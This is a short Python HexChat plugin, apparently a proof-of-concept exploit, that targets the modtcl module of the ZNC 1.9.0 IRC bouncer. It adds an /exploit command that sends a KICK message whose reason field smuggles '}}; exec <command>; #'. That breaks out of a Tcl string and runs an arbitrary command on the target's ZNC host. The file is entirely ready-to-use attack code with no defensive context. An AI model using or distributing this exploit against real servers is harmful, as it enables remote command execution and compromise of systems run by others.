import hexchat

__module_name__ = "modtcl-exploit"
__module_version__ = "1.0"
__module_description__ = "Plugin to exploit ZNC 1.9.0 modtcl module"
__module_author__ = "ph1ns"

def exploit(word, word_eol, userdata):

    if len(word) < 3:
        hexchat.prnt("Usage: /exploit <user> <command>")
        return hexchat.EAT_ALL

    _user = word[1]
    _command = " ".join(word[2:])

    print(f"Trying to execute {_command} on {_user} ...")
    hexchat.command(f'KICK {_user} "}}; exec {_command}; #')

    return hexchat.EAT_ALL

hexchat.hook_command("exploit", exploit, help="/exploit <user> <command>")
hexchat.prnt(f"{__module_name__} {__module_version__} loaded.")
